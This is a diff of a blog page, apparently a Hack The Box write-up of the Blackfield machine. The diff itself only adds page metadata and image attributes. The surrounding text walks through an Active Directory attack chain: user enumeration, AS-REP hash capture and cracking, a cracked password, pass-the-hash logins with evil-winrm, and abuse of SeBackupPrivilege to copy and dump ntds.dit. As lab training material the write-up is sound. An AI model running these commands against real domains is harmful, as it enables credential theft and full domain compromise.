@@ -3,6 +3,18 @@
 <head>
     <meta charset="utf-8">
     <title>HTB: Blackfield | HackWithJordan</title>
+    <!-- site-meta -->
+    <meta name="description" content="Walkthrough of the Hack The Box machine Blackfield, from first foothold to full compromise.">
+    <link rel="canonical" href="https://hackwithjordan.com/posts/2024-09-29-Blackfield(HTB).html">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="HackWithJordan">
+    <meta property="og:title" content="HTB: Blackfield">
+    <meta property="og:description" content="Walkthrough of the Hack The Box machine Blackfield, from first foothold to full compromise.">
+    <meta property="og:url" content="https://hackwithjordan.com/posts/2024-09-29-Blackfield(HTB).html">
+    <meta property="og:image" content="https://hackwithjordan.com/assets/room/poster.jpg">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta property="article:published_time" content="2024-09-29">
+    <!-- /site-meta -->
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <link rel="stylesheet" href="../assets/css/syntax.css">
     <style>
@@ -308,23 +320,23 @@
 
         <pre class="terminal"><code>kerbrute userenum -d blackfield.local /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt  --dc 10.10.10.192</code></pre>
 
-        <img alt="Screenshot 2" height="328" src="../img/posts/2024-09-29-Blackfield(HTB)/02-7a34d505d4.png" style="aspect-ratio:1129/328;" width="1129"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 2" height="328" src="../img/posts/2024-09-29-Blackfield(HTB)/02-7a34d505d4.png" style="aspect-ratio:1129/328;" width="1129"/>
 
         <p>Getting kerberos hashes for users with no pre auth set</p>
 
         <pre class="terminal"><code>impacket-GetNPUsers BLACKFIELD.LOCAL/ -dc-ip 10.10.10.192 -no-pass -usersfile users.txt</code></pre>
 
-        <img alt="Screenshot 3" height="296" src="../img/posts/2024-09-29-Blackfield(HTB)/03-0af0550e58.png" style="aspect-ratio:624/296;" width="624"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 3" height="296" src="../img/posts/2024-09-29-Blackfield(HTB)/03-0af0550e58.png" style="aspect-ratio:624/296;" width="624"/>
 
         <p>Cracking the hash with hashcat</p>
 
         <pre class="terminal"><code>hashcat hash.txt -m 18200 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule</code></pre>
 
-        <img alt="Screenshot 4" height="510" src="../img/posts/2024-09-29-Blackfield(HTB)/04-d122385c7b.png" style="aspect-ratio:986/510;" width="986"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 4" height="510" src="../img/posts/2024-09-29-Blackfield(HTB)/04-d122385c7b.png" style="aspect-ratio:986/510;" width="986"/>
 
         <p>Support:#00^BlackKnight</p>
 
-        <img alt="Screenshot 5" height="269" src="../img/posts/2024-09-29-Blackfield(HTB)/05-1d013d0c19.png" style="aspect-ratio:912/269;" width="912"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 5" height="269" src="../img/posts/2024-09-29-Blackfield(HTB)/05-1d013d0c19.png" style="aspect-ratio:912/269;" width="912"/>
 
         <h1 style="color:#5eead4;">Shell as svc_backup</h1>
 
@@ -350,7 +362,7 @@
 
         <p>We can force change password for the audit2020 user</p>
 
-        <img alt="Screenshot 6" height="934" src="../img/posts/2024-09-29-Blackfield(HTB)/06-3d31c6cbcf.png" style="aspect-ratio:852/934;" width="852"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 6" height="934" src="../img/posts/2024-09-29-Blackfield(HTB)/06-3d31c6cbcf.png" style="aspect-ratio:852/934;" width="852"/>
 
         <p>Change password</p>
 
@@ -358,11 +370,11 @@
 
         <p>We still cant remote in but the change did work.</p>
 
-        <img alt="Screenshot 7" height="99" src="../img/posts/2024-09-29-Blackfield(HTB)/07-75aa582045.png" style="aspect-ratio:1257/99;" width="1257"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 7" height="99" src="../img/posts/2024-09-29-Blackfield(HTB)/07-75aa582045.png" style="aspect-ratio:1257/99;" width="1257"/>
 
         <p>We have access to a new share</p>
 
-        <img alt="Screenshot 8" height="285" src="../img/posts/2024-09-29-Blackfield(HTB)/08-32af0e8e06.png" style="aspect-ratio:1062/285;" width="1062"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 8" height="285" src="../img/posts/2024-09-29-Blackfield(HTB)/08-32af0e8e06.png" style="aspect-ratio:1062/285;" width="1062"/>
 
         <p>This audit share seems to be a previous pentest. It contains tools and logs and zipped folders. The first log file that gave this away was the “domain_admins.txt” file showing the username administrator and with the password “ipwnedyourcompany”.</p>
 
@@ -376,13 +388,13 @@
 
         <pre class="terminal"><code>evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d</code></pre>
 
-        <img alt="Screenshot 9" height="506" src="../img/posts/2024-09-29-Blackfield(HTB)/09-bfe4a1c173.png" style="aspect-ratio:717/506;" width="717"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 9" height="506" src="../img/posts/2024-09-29-Blackfield(HTB)/09-bfe4a1c173.png" style="aspect-ratio:717/506;" width="717"/>
 
         <h1 style="color:#5eead4;">Shell as Administrator</h1>
 
         <p>We are svc_backup and have SeBackup enabled which we can use to access files we normally wouldnt be able to access.</p>
 
-        <img alt="Screenshot 10" height="272" src="../img/posts/2024-09-29-Blackfield(HTB)/10-a6f713e351.png" style="aspect-ratio:596/272;" width="596"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 10" height="272" src="../img/posts/2024-09-29-Blackfield(HTB)/10-a6f713e351.png" style="aspect-ratio:596/272;" width="596"/>
 
         <p>I initially grabbed the sam/system file and dumped those hashes but they ended up being incorrect and I couldnt remote in as admin. I was stuck for a while at this point as I couldnt copy the ntds.dit file right away.</p>
 
@@ -394,7 +406,7 @@
 
         <pre class="terminal"><code>https://github.com/giuliano108/SeBackupPrivilege</code></pre>
 
-        <img alt="Screenshot 11" height="188" src="../img/posts/2024-09-29-Blackfield(HTB)/11-2720f98766.png" style="aspect-ratio:827/188;" width="827"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 11" height="188" src="../img/posts/2024-09-29-Blackfield(HTB)/11-2720f98766.png" style="aspect-ratio:827/188;" width="827"/>
 
         <p>Once imported we can use the privilege but we cannot copy the ntds.dit file yet because its always “in use” by windows/AD so we cannot copy it while the machine is running. The guide shows us how to create a copy of the C drive allowing us to copy it. The next challenge was using diskshadow as we didnt have an interactive shell.</p>
 
@@ -412,13 +424,13 @@
 
         <p>We get a fully interactive shell where diskshadow will work</p>
 
-        <img alt="Screenshot 12" height="337" src="../img/posts/2024-09-29-Blackfield(HTB)/12-afd6de11bf.png" style="aspect-ratio:888/337;" width="888"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 12" height="337" src="../img/posts/2024-09-29-Blackfield(HTB)/12-afd6de11bf.png" style="aspect-ratio:888/337;" width="888"/>
 
         <p>Creating the clone of C:</p>
 
         <p><code>set context persistent nowriters</code><br/><code>add volume C: alias morph3</code><br/><code>create</code><br/><code>expose %morph3% G:</code><br/> </p>
 
-        <img alt="Screenshot 13" height="559" src="../img/posts/2024-09-29-Blackfield(HTB)/13-53ffb6c069.png" style="aspect-ratio:953/559;" width="953"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 13" height="559" src="../img/posts/2024-09-29-Blackfield(HTB)/13-53ffb6c069.png" style="aspect-ratio:953/559;" width="953"/>
 
         <p>We can see it works as we cd to G:</p>
 
@@ -426,23 +438,23 @@
 
         <pre class="terminal"><code>Copy-FileSeBackupPrivilege G:\windows\NTDS\ntds.dit c:\windows\temp\ntds.dit</code></pre>
 
-        <img alt="Screenshot 14" height="61" src="../img/posts/2024-09-29-Blackfield(HTB)/14-2bf1bc5711.png" style="aspect-ratio:999/61;" width="999"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 14" height="61" src="../img/posts/2024-09-29-Blackfield(HTB)/14-2bf1bc5711.png" style="aspect-ratio:999/61;" width="999"/>
 
         <p>Confirming it worked and downloading it to our local machine</p>
 
-        <img alt="Screenshot 15" height="445" src="../img/posts/2024-09-29-Blackfield(HTB)/15-958794ff30.png" style="aspect-ratio:743/445;" width="743"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 15" height="445" src="../img/posts/2024-09-29-Blackfield(HTB)/15-958794ff30.png" style="aspect-ratio:743/445;" width="743"/>
 
         <p>Dumping ntds.dit hashes(we were able to download the system file with reg save HKLM\System)</p>
 
         <pre class="terminal"><code>impacket-secretsdump -system ./SYSTEM -ntds ./ntds.dit LOCAL</code></pre>
 
-        <img alt="Screenshot 16" height="502" src="../img/posts/2024-09-29-Blackfield(HTB)/16-2b5e3d5972.png" style="aspect-ratio:1027/502;" width="1027"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 16" height="502" src="../img/posts/2024-09-29-Blackfield(HTB)/16-2b5e3d5972.png" style="aspect-ratio:1027/502;" width="1027"/>
 
         <pre class="terminal"><code>evil-winrm -i 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee</code></pre>
 
-        <img alt="Screenshot 17" height="284" src="../img/posts/2024-09-29-Blackfield(HTB)/17-46cce3303d.png" style="aspect-ratio:670/284;" width="670"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 17" height="284" src="../img/posts/2024-09-29-Blackfield(HTB)/17-46cce3303d.png" style="aspect-ratio:670/284;" width="670"/>
 
-        <img alt="Screenshot 18" height="635" src="../img/posts/2024-09-29-Blackfield(HTB)/18-167f8546c3.png" style="aspect-ratio:693/635;" width="693"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 18" height="635" src="../img/posts/2024-09-29-Blackfield(HTB)/18-167f8546c3.png" style="aspect-ratio:693/635;" width="693"/>
     </article>
 
 <script>
